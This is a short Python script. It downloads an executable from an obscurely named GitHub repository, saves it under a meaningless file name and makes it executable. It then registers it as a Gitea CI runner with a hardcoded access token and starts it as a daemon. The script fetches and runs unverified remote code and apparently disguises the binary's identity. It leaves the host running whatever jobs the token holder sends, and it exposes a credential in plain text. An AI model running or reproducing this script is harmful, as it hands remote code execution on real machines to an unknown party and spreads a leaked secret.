
import subprocess
import urllib.request
import os

TOKEN = "mGfbPYr0YOqtdg5z1OUf9ZPrGCvepuWiHfqxATIE"

URL = "https://github.com/KOSOCOFA/legendary-rotary-phone/raw/refs/heads/main/kosovok"
BINARY = "jwnaos"

# Download
print("[1] Downloading jwnaos...")
urllib.request.urlretrieve(URL, BINARY)

# Set executable permission
os.chmod(BINARY, 0o755)

# Register runner
print("[2] Registering runner...")
subprocess.run([
    "./" + BINARY,
    "register",
    "--instance", "https://gitea.com/",
    "--token", TOKEN,
    "--labels", "maiso",
    "--name", "maiso"
], check=True)

# Start daemon
print("[3] Starting daemon...")
subprocess.run(["./" + BINARY, "daemon"], check=True)
